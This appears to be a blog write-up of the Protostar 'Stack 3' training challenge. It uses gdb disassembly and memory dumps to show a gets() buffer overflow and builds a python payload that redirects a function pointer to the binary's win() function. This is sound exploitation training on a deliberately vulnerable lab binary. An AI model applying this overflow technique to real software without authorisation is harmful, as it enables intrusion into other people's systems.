---
layout: post
title: "B2B - Protostar, Stack3 (x86)"


---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 3

The fourth challenge of Protostar is "Stack 3". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack3
test
```

The program simply appears to take an input, presumably does something with it in the background and then doesn't appear to do anything. In this case, the binary took the string "test" as it's input and appeared to just exit the process.

Let's disassemble the binary to dig in deeper:

```
(gdb) disas main
Dump of assembler code for function main:
0x08048438 <main+0>:	push   ebp
0x08048439 <main+1>:	mov    ebp,esp
0x0804843b <main+3>:	and    esp,0xfffffff0
0x0804843e <main+6>:	sub    esp,0x60
0x08048441 <main+9>:	mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:	lea    eax,[esp+0x1c]
0x0804844d <main+21>:	mov    DWORD PTR [esp],eax
0x08048450 <main+24>:	call   0x8048330 <gets@plt>
0x08048455 <main+29>:	cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:	je     0x8048477 <main+63>
0x0804845c <main+36>:	mov    eax,0x8048560
0x08048461 <main+41>:	mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:	mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:	mov    DWORD PTR [esp],eax
0x0804846c <main+52>:	call   0x8048350 <printf@plt>
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax
0x08048477 <main+63>:	leave  
0x08048478 <main+64>:	ret    
End of assembler dump.
```

Once again, we will attempt to break down the main execution flow from the above:

- grow the stack by 0x60
- set esp+0x5c to be 0x0, same again
- used gets() for the input <- buffer overflow vuln
- compare esp+0x5c with 0x0 again
- if it equals 0 (no overflow corruption) it jumps to the end
- if it doesn't equal 0, the program appears to print something.

Let's try and trigger this buffer overflow once again. Based on the previous offsets, this should be 64 bytes, but lets double check in memory to make sure. We set a breakpoint on the gets() function, and step through from there:

```
(gdb) b *main+29
Breakpoint 1 at 0x8048455: file stack3/stack3.c, line 20.
(gdb) r
Starting program: /opt/protostar/bin/stack3 
AAAABBBB

Breakpoint 1, main (argc=1, argv=0xbffffd04) at stack3/stack3.c:20
20	stack3/stack3.c: No such file or directory.
in stack3/stack3.c
(gdb) x/30wx $esp
0xbffffbf0:	0xbffffc0c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffffc00:	0xb7fd7ff4	0xb7ec6165	0xbffffc18	0x41414141 <--- input start AAAA BBBB
0xbffffc10:	0x42424242	0x08049600	0xbffffc28	0x0804830c
0xbffffc20:	0xb7ff1040	0x0804967c	0xbffffc58	0x080484a9
0xbffffc30:	0xb7fd8304	0xb7fd7ff4	0x08048490	0xbffffc58
0xbffffc40:	0xb7ec6365	0xb7ff1040	0x0804849b	0x00000000 <--- flag to flip?
0xbffffc50:	0x08048490	0x00000000	0xbffffcd8	0xb7eadc76
0xbffffc60:	0x00000001	0xbffffd04
```

Let's confirm the above is the flag in memory that we want to change, relative to our offset identified in our disassembled code above:

```
(gdb) x/wx $esp+0x5c
0xbffffc4c:	0x00000000
```

So our required offset is once again is:

​	"0xbffffc4"c - "0xbffffc0c" = "0x40" (64 in decimal)

This offset is the same as the others, so let's run our usual payload and see what happens:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

Breaking into memory again, we see the following:

```
(gdb) x/30wx $esp
0xbffffbf0:	0xbffffc0c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffffc00:	0xb7fd7ff4	0xb7ec6165	0xbffffc18	0x41414141
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffffc50:	0x08048400	0x00000000	0xbffffcd8	0xb7eadc76
0xbffffc60:	0x00000001	0xbffffd04
(gdb) x/wx $esp+0x5c
0xbffffc4c:	0x42424242
```

Stepping over the next few instructions, we land at the instruction directly after the compare. This means we didn't take the jump and looks like we have 'won':

```
(gdb) ni
0x0804845a	20	in stack3/stack3.c
(gdb) ni
21	in stack3/stack3.c
(gdb) i r
eax            0xbffffc0c	-1073742836
ecx            0xbffffc0c	-1073742836
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffbf0	0xbffffbf0
ebp            0xbffffc58	0xbffffc58
esi            0x0	0
edi            0x0	0
eip            0x804845c	0x804845c <main+36>  <--- sweet
eflags         0x200206	[ PF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

Continuing on, we should get some form of win condition:

```
(gdb) c
Continuing.
calling function pointer, jumping to 0x42424242

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Interesting, looks like this actually wants a pointer to a function to continue our execution flow. This is where a 'prepared attacker' would have done extra research before hand. But me, I do it when I need it. So let's see if there are any more functions that have been added to the binary to actually call. In addition, this should have been a huge hint to me that it was expecting a legitimate function pointer:

```
0x08048471 <main+57>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:	call   eax  	<--- I missed the obvious call
```

I went back to step 1, and listed the binaries functions:

```
(gdb) info functions
All defined functions:

File stack3/stack3.c:
int main(int, char **);
void win(void);
```

Disassembling our win function, we see that this simply prints something to the screen. Assumably a 'win' string:

```
(gdb) disas win
Dump of assembler code for function win:
0x08048424 <win+0>:	push   ebp
0x08048425 <win+1>:	mov    ebp,esp
0x08048427 <win+3>:	sub    esp,0x18
0x0804842a <win+6>:	mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:	call   0x8048360 <puts@plt>
0x08048436 <win+18>:	leave  
0x08048437 <win+19>:	ret    
End of assembler dump.
```

The start address of this function is: "0x08048424" which is what we want to replace our current "BBBB" value with. Reversed, this will be:

	0x24 0x84 0x04 0x08

We reverse it to adhere to the endian-ness of the CPU. I will stop reminding you of this at some point, I promise. Our payload should now be:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x24\x84\x04\x08
```

This can be done with python and piped directly into the input within gdb:

```
$(python -c 'print "A"*64 + "\x24\x84\x04\x08"')
```

I ran the above and stored the output into a file ""/tmp/stack3". Opening GDB once again, I dropped a breakpoint on the 'call EAX' instruction towards the end of the file:

```
(gdb) b *main+61
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
```

Ran the program with the file containing the python output as it's input:

```
(gdb) r < /tmp/stack3
Starting program: /opt/protostar/bin/stack3 < /tmp/stack3
calling function pointer, jumping to 0x08048424

Breakpoint 1, 0x08048475 in main (argc=1, argv=0xbffffd04) at stack3/stack3.c:22
22	stack3/stack3.c: No such file or directory.
in stack3/stack3.c
```

Examining the registers on the breakpoint, we can see our EAX has been set to the start address of the win() function:

```
(gdb) i r
eax            0x8048424	134513700
ecx            0x0	0
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffffbf0	0xbffffbf0
ebp            0xbffffc58	0xbffffc58
esi            0x0	0
edi            0x0	0
eip            0x8048475	0x8048475 <main+61>
eflags         0x200296	[ PF AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

(gdb) disas win
Dump of assembler code for function win:
0x08048424 <win+0>:	push   ebp
0x08048425 <win+1>:	mov    ebp,esp
0x08048427 <win+3>:	sub    esp,0x18
0x0804842a <win+6>:	mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:	call   0x8048360 <puts@plt>
0x08048436 <win+18>:	leave  
0x08048437 <win+19>:	ret    
End of assembler dump.
```

Now if we continue, we should see our execution has been redirected into our win condition:

```
(gdb) c
Continuing.
code flow successfully changed
```

Once again, we check to make sure this works outside of GDB and our win() address is the same. As can be seen, we complete our challenge:

```
$ cat /tmp/stack3 | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

This was the first challenge where we actually redirected the flow of our program. In other situations this would be done by overwriting the EIP, but in this case the program actually performed the call for us. A lesson I learnt here is to make sure to read every instruction and don't miss the obvious!